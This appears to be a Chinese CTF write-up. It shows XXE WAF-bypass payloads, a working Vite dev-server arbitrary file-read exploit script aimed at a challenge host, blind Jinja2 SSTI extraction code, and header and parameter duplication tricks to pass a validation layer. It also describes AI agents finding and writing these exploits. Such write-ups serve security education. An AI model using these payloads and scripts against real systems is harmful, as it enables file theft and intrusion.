##### 探测WAF

##### 探测执行器

紧接着我们测试执行器的逻辑。一点简单的前期测试就能知道执行器渲染XML中text标签之间的内容。

| 输入（无 DTD）   | 回显          |
| ----------- | ----------- |
| `&amp;`     | `?amp?`     |
| `&lt;`      | `?lt?`      |
| `&#65;`     | `?65?`      |
| `A & B ; C` | `A ? B ? C` |

很怪，一些内置实体执行器不解析。紧接着我们做了针对DTD的控制变量解析。

| #   | DTD                                                                | `<text>`  | 回显                                                    | 说明                  |
| --- | ------------------------------------------------------------------ | --------- | ----------------------------------------------------- | ------------------- |
| P1  | `<! DOCTYPE svg [<! ENTITY xxe SYSTEM "http://127.0.0.1/ALPHA">]>` | `F:&xxe;` | `F:Remote media URL rejected: http://127.0.0.1/ALPHA` | 标记 **ALPHA** 出现在回显里 |
| P2  | 同上，仅 URL 换成 `…/BETA`                                               | `F:&xxe;` | `F:Remote media URL rejected: http://127.0.0.1/BETA`  | 标记**跟随声明发生变化**      |
| C1  | 同 P1，`<text>` 不引用实体                                                | `F:`      | `F:`                                                  | 不引用则标记**不出现**       |
| C2  | `<! DOCTYPE svg []>`（无 ENTITY 声明）                                  | `F:&xxe;` | `F:?xxe?`                                             | 无声明则不出现任何东西         |
| C3  | 完全无 DTD                                                            | `F:&xxe;` | `F:?xxe?`（与 C2 同图）                                    | 同上                  |

*以上表格中的测试用例及结果均为Agent生成或整理*

**发现能绕过WAF的 `<! DOCTYPE` 加空格写法可以被解析器处理到。** 这是一个非常重要的成果。执行器可能**并不是XML解析器，或者说不是一个非常标准的XML解析器**。由上表可见XML内建实体执行器不会进行解析。并且在XML规范中不允许的`<! DOCTYPE`加空格写法它可以进行渲染。

**这跟我自己知道的XML知识和Agent知道的XML知识有所不同，所以一直卡在这里。**

##### 最终结论

综上，我们可以给出三种WAF绕过payload：

第一种是我们刚才一路讨论下来的加空格绕过。是我（人类思维 @ 双手和键盘）提出。基于执行器的宽松性。

```xml
<! DOCTYPE svg [<! ENTITY xxe SYSTEM "URL">]><svg xmlns="http://www.w3.org/2000/svg" width="800" height="200"><text x="10" y="100" font-size="24">FLAG:&xxe;</text></svg>
```

第二种是最早拿到flag的Agent给出的PI伪注释。是Agent（GLM5.3 @ OpenCode）提出。基于WAF的注释剥离行为。当时Agent认为执行器是XML解析器。这是一个相当强大的payload，可以应对比本题更加严格的后端。

```xml
<?p <!--?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "URL">]><!----><svg xmlns="http://www.w3.org/2000/svg" width="800" height="200"><text x="10" y="100" font-size="24">FLAG:&xxe;</text></svg>
```

第三种是对第二种的简化。由我提出。因为我们可以注意到那个执行器好像**根本不是XML解析器**，直接抛弃掉PI伪注释。

```xml
<!--<!DOCTYPE svg [<!ENTITY xxe SYSTEM "URL">]>--><svg xmlns="http://www.w3.org/2000/svg" width="800" height="200"><text x="10" y="100" font-size="24">FLAG:&xxe;</text></svg>
```

在填充正确URL后，三种payload均可以获取flag。

*向网页端DeepSeek询问Vite CVE信息*

这里跑去问DS网页版是因为它的网络搜索比较顺滑。发现了该vite版本的任意文件读取漏洞。直接让DS网页端写出利用脚本，再让DeepSeek V4.1 flash @ Claude Code略作修改确认可用。

```python
#!/usr/bin/env python3  
"""CVE-2026-39363: Vite dev server 任意文件读（CTF / 授权测试用）。  
  
HMR WebSocket 上的 vite:invoke -> fetchModule 不套 server.fs 检查，  
file:// + ?raw 即可读 Vite 进程可及范围内的任意文件（HTTP 面 403/404 的都能读）。  
  
要点：  
- suppress_origin=True 不发 Origin 头 -> 服务端连 token/Host 都不校验，直接可用。  
- data 必须是**位置参数数组**；响应 id = 发送 id 把 "send" 换成 "response"。  
- 返回的是模块串 export default "..."，取出中间那段 JSON 字符串即可还原原文。  
"""  
  
import json  
import ssl  
  
import websocket  
  
TARGET = "52796a376d7a6c41555847426b5351696c434e6a73-p5173.chal.buptmerak.cn"  
FILE = "/app/frontend/src/main.js"  # ← 想读哪个文件改这里（注意是**文件系统**路径，不是 URL 路径）  
  
ws = websocket.create_connection(  
    f"wss://{TARGET}/",  
    subprotocols=["vite-hmr"],  
    suppress_origin=True,  # 关键：不发 Origin  
    timeout=15,  
    sslopt={"cert_reqs": ssl.CERT_NONE},  
)  
ws.recv()  # 首帧 {"type":"connected"}，丢掉  
  
ws.send(json.dumps({  
    "type": "custom",  
    "event": "vite:invoke",  
    "data": {"name": "fetchModule", "id": "send:t1", "data": [f"file://{FILE}?raw"]},  
}))  
  
while True:  # HMR 会夹带其它事件，按 id 挑出自己的响应  
    msg = json.loads(ws.recv())  
    data = msg.get("data") or {}  
    if msg.get("event") != "vite:invoke" or data.get("id") != "response:t1":  
        continue  
    inner = data.get("data") or {}  
    if "error" in inner:  
        print("[-]", inner["error"].get("message"))  
    else:  
        code = inner["result"]["code"]  
        print(json.loads(code[code.index('"'):code.rindex('"') + 1]))  
    break  
  
ws.close()
```

    body = {  
        "template_name": "custom_stage_notice",  
        "receiver": "R", "subject": "S",

这是在读取了`/src/main.js`看到后端传参方式之后写出的oracle。我认为这里的oracle有着非常不错的结构，就是在提取出布尔值`r.json()["status"] == "failed"`之前做了关于WAF的断言，把WAF的拦截作为错误直接抛出，使得脚本使用者可以尽早发现WAF造成的影响。

```python
n = 1  
while oracle(f"{A}|length > {n}"):  
    n *= 2  
lo, hi = n // 2, n  
while lo + 1 < hi:  
    mid = (lo + hi) // 2  
    lo, hi = (mid, hi) if oracle(f"{A}|length > {mid}") else (lo, mid)  
n = hi  
print(f"[+] 长度: {n}")
```

这是一个长度上限倍乘之后叠加二分查找。把 oracle 调用次数从线性 O(L) 降为对数 O(log L)。快速求出flag的长度。注意到我们使用jinja2那个|length过滤器。

```python
flag = ""  
for i in range(n):  
    lo, hi = 31, 127  
    while lo < hi:  
        mid = (lo + hi) // 2  
        if oracle(f"{A}[{i}] <= {json.dumps(chr(mid))}"):  
            hi = mid  
        else:  
            lo = mid + 1  
    flag += chr(lo)  
    print("\r[+] " + flag, end="", flush=True)  
print(f"\n[=] {flag.strip()}")
```

稍微踩了坑，就是data是绝对不能转为python字典然后通过json传参进行post的，否则签名就会失效。这个时候我意识到服务器对body有严格的校验，body不能进行任何修改。我们的修改只能集中在param（query）和请求头。

X-Signature的值来自于捕获的signature字段。X-Event-Id的值来自于捕获的event_id字段。X-Tenant的值来自于备忘里的公共租户固定为public。

我们在这一阶段遇到困难。启动Agent fuzz了一下。依旧是WAF-执行器的结构。

*AI总结的校验层-业务层要求。下文图片若无特殊说明，均为AI生成 解释文本为手写*

校验层我们测试是必须出现一次完整的phase=preview，且phase不能出现两次。这里我们可以通过对另一个phase进行URL编码来进行绕过。“同一段 query，在不同客户端上发出去的字节不一样，网关只兼容了其中一部分。”这在备忘中有所提及。

![](/img/in-post/2026-10-21-tsctf-j-2026-wp/Pasted-image-20261011213618.png)

X-Tenant对于校验层（极有可能是取首个值）必须取值public，而对于业务层，极有可能是取第一个非public值，必须取值vault-38cad4。这个值从捕获的请求体中得到的。

X-Event-Id受业务层检验，不能沿用已有事件的编号。这一点是从备忘中看出来的。“第二阶段提交时，不带上一阶段的回执、或沿用上一次的事件编号，都会被直接拒绝。”我们一并可知需要带上X-Compat-Receipt回执。

综上所述，两个phase=preview和=commit，双写的X-Tenant，随便新做的X-Event-Id，带上X-Compat-Receipt，我们将一发入魂。
